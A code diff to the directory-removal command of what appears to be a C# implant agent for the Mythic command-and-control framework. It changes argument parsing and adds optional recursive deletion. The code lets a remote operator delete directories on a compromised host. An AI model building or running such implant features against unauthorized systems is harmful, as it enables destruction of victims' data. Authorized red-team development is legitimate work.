@@ -14,21 +14,27 @@ namespace Cerberus.Commands
 
         public override string Execute(MythicTask task)
         {
-            var Arguments = task.parameters.Split(' ');
-            if (Arguments is null || Arguments.Length == 0)
+            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<RmdirParam>();
+
+            if (Arguments is null || Arguments.path is null)
             {
                 return "No path provided";
             }
 
-            var path = Arguments[0];
-            Directory.Delete(path, true);
+            Directory.Delete(Arguments.path, Arguments.recurse);
 
-            if (!Directory.Exists(path))
+            if (!Directory.Exists(Arguments.path))
             {
-                return $"{path} deleted";
+                return $"{Arguments.path} deleted";
             }
 
-            return $"Failed to delete {path}";
+            return $"Failed to delete {Arguments.path}";
         }
+    }
+
+    public class RmdirParam
+    {
+        public string path { get; set; }
+        public bool recurse { get; set; }
     }
 }
